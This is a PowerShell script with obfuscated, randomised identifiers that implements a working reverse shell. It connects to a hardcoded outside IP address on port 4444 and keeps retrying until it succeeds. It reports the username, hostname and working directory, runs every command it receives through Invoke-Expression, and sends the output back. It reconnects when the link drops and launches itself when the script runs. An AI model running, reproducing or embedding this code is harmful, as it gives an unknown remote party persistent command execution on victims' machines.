class QwjNexDGk {
    
    [string]$KaTeBvtRnIkrISGfzeRmBJI = "93.49.240.195"
    [int]$kPmqZlzqhUt = 4444

    $TmtgeZIsbFeDoclAUicGk
    $YyIBSfXdLcudNABI
    $MdkGqJok
    $QCdUTLNeXdHQxnFocy
    $IRXeQwIfvKjBtPsfvBqG
    $XVZVjfxVujYigpegdWrp
    [int]$QoBgqVPzDxNPV = 50*1024

    RaKbqqqelEMAw() {
        $this.YyIBSfXdLcudNABI = $false
        while ($true) {
            try {
                $this.YyIBSfXdLcudNABI = New-Object Net.Sockets.TcpClient($this.KaTeBvtRnIkrISGfzeRmBJI, $this.kPmqZlzqhUt)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.nRYqtsBlpFNnKXNWHHntf()
    }

    nRYqtsBlpFNnKXNWHHntf() {
        $this.TmtgeZIsbFeDoclAUicGk = $this.YyIBSfXdLcudNABI.GetStream()
        $this.QCdUTLNeXdHQxnFocy = New-Object Byte[] $this.QoBgqVPzDxNPV
        $this.XVZVjfxVujYigpegdWrp = New-Object Text.UTF8Encoding
        $this.MdkGqJok = New-Object IO.StreamWriter($this.TmtgeZIsbFeDoclAUicGk, [Text.Encoding]::UTF8, $this.QoBgqVPzDxNPV)
        $this.IRXeQwIfvKjBtPsfvBqG = New-Object System.IO.StreamReader($this.TmtgeZIsbFeDoclAUicGk)
        $this.MdkGqJok.AutoFlush = $true
    }

    tAjpVce() {
        $this.RaKbqqqelEMAw()
        $this.UJkCELZCt()
    }

    ZewPjcJHRFSVemqZMfi($XYleYdaNfXI) {
        try {
            [byte[]]$bChGekZHQjrWqXvaxrZi = [text.Encoding]::Ascii.GetBytes($XYleYdaNfXI)
            $this.MdkGqJok.Write($bChGekZHQjrWqXvaxrZi, 0, $bChGekZHQjrWqXvaxrZi.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.tAjpVce()
        }
    }

    [string] mFnNulUTVcq() {
        try {
            $fHoyM = $this.TmtgeZIsbFeDoclAUicGk.Read($this.QCdUTLNeXdHQxnFocy, 0, $this.QoBgqVPzDxNPV)    
            $nrWVlYwlv = ($this.XVZVjfxVujYigpegdWrp.GetString($this.QCdUTLNeXdHQxnFocy, 0, $fHoyM))
            return $nrWVlYwlv
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.tAjpVce()
            return ""
        }
    }

    [string] BrirNZ($AUVlYQcV) {
        Write-Host $AUVlYQcV
        try { 
            $uehVKQqBFfAryxjFDuNDLUsl = Invoke-Expression $AUVlYQcV | Out-String
        }
        catch {
            $YMkKIB = $_.Exception
            $fflDrQhZtjWyKvPbOwx = $_.Message
            $uehVKQqBFfAryxjFDuNDLUsl = "`n$_`n"
        }
        return $uehVKQqBFfAryxjFDuNDLUsl
    }

    [string] ghXIqlNj() {
        $OAUGVNFvRj = [Environment]::UserName
        $JrEVOyCpA = [System.Net.Dns]::GetHostName()
        $TestUhseEYbNuyHD = Get-Location
        return "$OAUGVNFvRj@$JrEVOyCpA [$TestUhseEYbNuyHD]~$ "
    }

    UJkCELZCt() {
        while ($this.YyIBSfXdLcudNABI.Connected) {
            $this.ZewPjcJHRFSVemqZMfi($this.ghXIqlNj())         
            $nrWVlYwlv = $this.mFnNulUTVcq()
            $uehVKQqBFfAryxjFDuNDLUsl = "`n"
            if ([string]::IsNullOrEmpty($nrWVlYwlv)) {
                continue
            }
            $uehVKQqBFfAryxjFDuNDLUsl = $this.BrirNZ($nrWVlYwlv)
            $this.ZewPjcJHRFSVemqZMfi($uehVKQqBFfAryxjFDuNDLUsl + "`n")
            $this.TmtgeZIsbFeDoclAUicGk.Flush()
        }
        $this.YyIBSfXdLcudNABI.Close()
        $this.tAjpVce()
    } 
}

$bpObvAWpHObHVuTuXZRO = [QwjNexDGk]::new()
$bpObvAWpHObHVuTuXZRO.tAjpVce()
